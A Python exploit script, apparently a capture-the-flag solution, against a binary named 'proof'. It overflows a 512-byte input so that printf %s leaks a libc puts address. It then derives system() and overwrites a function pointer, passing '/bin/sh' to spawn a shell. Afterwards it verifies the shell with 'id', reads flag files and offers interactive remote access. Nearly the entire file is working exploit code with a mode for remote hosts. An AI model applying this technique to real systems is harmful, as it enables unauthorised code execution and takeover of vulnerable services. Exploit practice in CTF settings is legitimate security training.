#!/usr/bin/env python3
"""lean-proofs exploit: leak puts via %s overflow, then system('/bin/sh')"""
import os, sys, struct, subprocess, socket, time, re

PUTS_OFF = 0x87be0
SYSTEM_OFF = 0x58750

def u64(b):
    return struct.unpack("<Q", b.ljust(8, b"\x00")[:8])[0]

class Conn:
    def __init__(self, proc=None, sock=None):
        self.proc = proc
        self.sock = sock
        self.buf = b""
    def recv(self, n=4096, timeout=5):
        if self.sock:
            self.sock.settimeout(timeout)
            return self.sock.recv(n)
        else:
            # proc stdout
            import select
            r,_,_ = select.select([self.proc.stdout], [], [], timeout)
            if not r:
                raise TimeoutError("recv timeout")
            data = os.read(self.proc.stdout.fileno(), n)
            return data
    def recvn(self, n):
        out = b""
        while len(out) < n:
            c = self.recv(n-len(out))
            if not c:
                break
            out += c
        return out
    def recvuntil(self, delim: bytes, timeout=5):
        if isinstance(delim, str):
            delim = delim.encode()
        start = time.time()
        while delim not in self.buf:
            if time.time()-start > timeout:
                raise TimeoutError(f"recvuntil timeout waiting for {delim!r}, have {self.buf[-200:]!r}")
            c = self.recv(4096, timeout=timeout)
            if not c:
                raise EOFError(f"EOF waiting for {delim!r}, have {self.buf[-500:]!r}")
            self.buf += c
        idx = self.buf.index(delim)+len(delim)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out
    def send(self, data: bytes):
        if self.sock:
            self.sock.sendall(data)
        else:
            os.write(self.proc.stdin.fileno(), data)
    def sendafter(self, delim, data):
        self.recvuntil(delim)
        self.send(data)
    def interactive(self):
        # simple interactive: forward stdin/stdout
        import select, tty, termios
        print("[*] interactive, Ctrl-C to exit")
        try:
            while True:
                r,_,_ = select.select([self.sock if self.sock else self.proc.stdout, sys.stdin], [], [], 0.1)
                for f in r:
                    if f == sys.stdin:
                        d = os.read(sys.stdin.fileno(), 4096)
                        if d:
                            self.send(d)
                    else:
                        try:
                            d = self.recv(4096, timeout=0.5)
                        except Exception:
                            continue
                        if d:
                            sys.stdout.buffer.write(d)
                            sys.stdout.buffer.flush()
                        else:
                            return
                # drain buffered?
                if self.buf:
                    sys.stdout.buffer.write(self.buf)
                    sys.stdout.buffer.flush()
                    self.buf = b""
                # also try non-blocking recv
                try:
                    if self.sock:
                        self.sock.settimeout(0.05)
                        try:
                            d = self.sock.recv(4096)
                            if d:
                                sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
                            elif d == b"":
                                return
                        except socket.timeout:
                            pass
                    else:
                        import select as s
                        rr,_,_ = s.select([self.proc.stdout], [], [], 0.05)
                        if rr:
                            d = os.read(self.proc.stdout.fileno(), 4096)
                            if d:
                                sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
                except Exception as e:
                    pass
        except KeyboardInterrupt:
            pass

def exploit(conn):
    # wait banner
    conn.recvuntil(b"[ THE INCREDIBLE PROOF MACHINE ]")
    conn.recvuntil(b"specify left operand > ")
    left = b"A"*8  # 0x4141414141414141 no nulls
    conn.send(left)
    conn.recvuntil(b"specify right operand > ")
    right = b"B"*8
    conn.send(right)
    conn.recvuntil(b"specify proof method > ")
    conn.send(b"4\n")  # c=3 -> puts
    conn.recvuntil(b"enter your lemma > ")
    conn.send(b"C"*0x200)  # exactly 512, no null, so %s leaks left/right/proof
    # now server prints DETAILS + YOUR LEMMA + YOUR OPERANDS + press any key
    data = conn.recvuntil(b"press any key to formally prove your theorem... > ")
    # data contains b"YOUR LEMMA: " + leak
    # print hex for debug
    print("[*] DETAILS block hex:", data.hex()[:2000])
    # extract leak: after YOUR LEMMA: 
    # format: YOUR LEMMA: <512 C><8 A><8 B><6-8 puts><...>\nYOUR OPERANDS...
    m = re.search(b"YOUR LEMMA: ", data)
    if not m:
        print("[-] no YOUR LEMMA"); print(data); return
    leak_start = m.end()
    # find YOUR OPERANDS marker to bound
    m2 = re.search(b"\nYOUR OPERANDS:", data)
    if m2:
        lemma_field = data[leak_start:m2.start()]
    else:
        lemma_field = data[leak_start:leak_start+600]
    print(f"[*] lemma_field len={len(lemma_field)} hex={lemma_field.hex()}")
    # expected: 512 C (0x43) + 8 A + 8 B + puts addr
    # verify prefix
    assert lemma_field[:8] == b"C"*8, lemma_field[:16]
    # puts addr starts at offset 512+16=528
    off = 0x200+8+8
    puts_bytes = lemma_field[off:off+8]
    print(f"[*] puts_bytes hex={puts_bytes.hex()} len={len(puts_bytes)}")
    # puts_bytes may be truncated by null terminator? Top byte 0x00 terminates, so we may get 6 bytes + maybe following?
    # Actually after puts addr's null byte, print stops, so puts_bytes should be 6 non-null + truncated?
    # Let's pad: if len <8 due to null termination, recover.
    # The field ends at newline before YOUR OPERANDS, so after null terminator, no more bytes.
    # So puts_bytes is exactly the bytes up to null (exclusive?) No, printf %s stops at null, doesn't include null. So we get bytes up to but not including terminating null.
    # puts addr like 0x7f...xxxxxx, little endian bytes: low bytes non-zero, high byte 0x00 not printed? Wait %s prints bytes as characters until 0x00 byte. The proof pointer bytes are in memory little-endian; printing them as string will print raw bytes including any 0x00 terminates. So if puts = 0x00007f... , bytes = [low,...,0x7f,0x00, ...]. The 0x00 at byte 6? Actually 64-bit: bytes 0..5 non-zero? Byte 6 = 0x00? For 0x00007f... top two bytes zero? 0x00007f... => bytes: b0,b1,b2,b3,b4=0x7f?, wait need example: 0x7f1234567890? That's 0x00007f1234567890 => bytes LE: 90 78 56 34 12 7f 00 00. So null at byte 6 terminates. So we get 6 bytes then stop. Need to reconstruct: puts = u64(puts_bytes + b"\x00\x00")? But need to handle.
    if len(puts_bytes) < 8:
        # may have exactly 6 bytes (or 5 if contains null earlier? unlikely, low bytes shouldn't be zero often)
        print(f"[*] short puts_bytes, padding")
    # If puts_bytes length is 6, pad with \x00\x00
    # But what if puts_bytes includes trailing heap bytes after? No, because null terminates, so no trailing.
    # So puts_bytes should be 6 bytes.
    # Reconstruct:
    if len(puts_bytes) >= 8:
        puts_addr = u64(puts_bytes[:8])
    else:
        puts_addr = u64(puts_bytes)
    print(f"[+] leaked puts ~= {hex(puts_addr)}")
    libc_base = puts_addr - PUTS_OFF
    system_addr = libc_base + SYSTEM_OFF
    print(f"[+] libc_base={hex(libc_base)} system={hex(system_addr)}")
    # consume the getchar prompt
    conn.send(b"\n")
    # server will call puts(lemma) -> prints again, then DONE, then loops to next malloc
    # need to recv until next iteration's left operand prompt
    data2 = conn.recvuntil(b"specify left operand > ")
    print("[*] got second iteration prompt")
    # --- second iteration: system("/bin/sh") ---
    conn.send(b"A"*8)
    conn.recvuntil(b"specify right operand > ")
    conn.send(b"B"*8)
    conn.recvuntil(b"specify proof method > ")
    conn.send(b"1\n")  # any, will be overwritten
    conn.recvuntil(b"enter your lemma > ")
    payload = b"/bin/sh\x00" + b"D"*(0x200-8)  # 512 total lemma
    payload += b"E"*8  # left overwrite (ignored)
    payload += b"F"*8  # right overwrite
    payload += struct.pack("<Q", system_addr)
    assert len(payload) == 0x218, len(payload)
    conn.send(payload)
    data3 = conn.recvuntil(b"press any key to formally prove your theorem... > ")
    print("[*] second DETAILS:", data3[:500])
    conn.send(b"\n")
    # now server calls system("/bin/sh")
    time.sleep(0.5)
    # try to detect shell: send id
    conn.send(b"id\n")
    time.sleep(0.5)
    try:
        resp = conn.recv(4096, timeout=2)
        # include buffered?
        resp = conn.buf + resp
        conn.buf = b""
        print("[*] shell probe resp:", resp)
        if b"uid=" in resp:
            print("[+] GOT SHELL")
            return conn, True
        else:
            # try recv more
            print("[*] no uid yet, dumping more")
            try:
                extra = conn.recv(4096, timeout=2)
                print(extra)
                if b"uid=" in extra:
                    print("[+] GOT SHELL")
                    return conn, True
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)
    return conn, False

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=None)
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--local", action="store_true")
    args = ap.parse_args()
    if args.host:
        s = socket.create_connection((args.host, args.port))
        c = Conn(sock=s)
        conn, ok = exploit(c)
        if ok:
            # interactive
            print("[*] entering interactive")
            # simple loop
            s.settimeout(0.5)
            # drain?
            try:
                while True:
                    try:
                        d = s.recv(4096)
                        if d:
                            sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
                        else:
                            break
                    except socket.timeout:
                        pass
                    # read stdin nonblocking? use select
                    import select
                    r,_,_ = select.select([sys.stdin], [], [], 0.1)
                    if r:
                        line = sys.stdin.buffer.readline()
                        if not line:
                            break
                        s.sendall(line)
            except KeyboardInterrupt:
                pass
        else:
            print("[-] exploit failed")
    elif args.local:
        p = subprocess.Popen(["./proof"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
        c = Conn(proc=p)
        conn, ok = exploit(c)
        if ok:
            print("[+] local shell, sending flag cmds")
            c.send(b"cat flag* 2>&1; echo ---; ls -la; echo ---; cat /flag* 2>&1\n")
            time.sleep(0.5)
            try:
                print(c.recv(8192, timeout=2))
                print(c.buf)
            except Exception as e:
                print(e)
        else:
            print("[-] failed")
            # dump?
            p.terminate()
    else:
        print("use --local or --host/--port")
